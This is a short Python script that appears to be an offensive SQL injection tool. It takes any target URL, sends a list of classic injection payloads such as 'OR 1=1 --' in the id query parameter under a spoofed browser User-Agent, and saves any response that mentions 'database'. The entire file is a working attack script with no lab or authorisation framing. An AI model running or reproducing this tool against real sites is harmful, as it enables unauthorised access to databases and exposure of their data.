import requests
import re

# List of common SQL injection payloads
PAYLOADS = [
    "' OR 1=1 --",
    "' OR 'a'='a",
    "' OR 1=1#",
    "' OR '1'='1'/*",
]

def is_valid_url(url):
    """Validate the URL format."""
    pattern = re.compile(
        r'^(https?://)?([a-zA-Z0-9.-]+)(:[0-9]+)?(/.*)?$'
    )
    return pattern.match(url) is not None

def sql_injection(url):
    """Attempt SQL injection with multiple payloads."""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
    }

    for payload in PAYLOADS:
        try:
            print(f"Trying payload: {payload}")
            response = requests.get(f"{url}?id={payload}", headers=headers, timeout=5)

            if "database" in response.text.lower():
                print("SQL Injection successful!")
                return response.text  # Return the successful response

        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")
    
    print("SQL Injection failed with all payloads.")
    return None

def save_response(response, filename="sql_injection_result.txt"):
    """Save the HTTP response to a log file."""
    try:
        with open(filename, 'w') as f:
            f.write(response)
        print(f"Response saved to {filename}")
    except Exception as e:
        print(f"Failed to save the file: {e}")

if __name__ == "__main__":
    url = input("Enter target URL: ").strip()

    if is_valid_url(url):
        result = sql_injection(url)
        if result:
            save_option = input("Do you want to save the result to a file? (y/n): ").strip().lower()
            if save_option == 'y':
                save_response(result)
    else:
        print("Invalid URL format. Please enter a valid URL.")
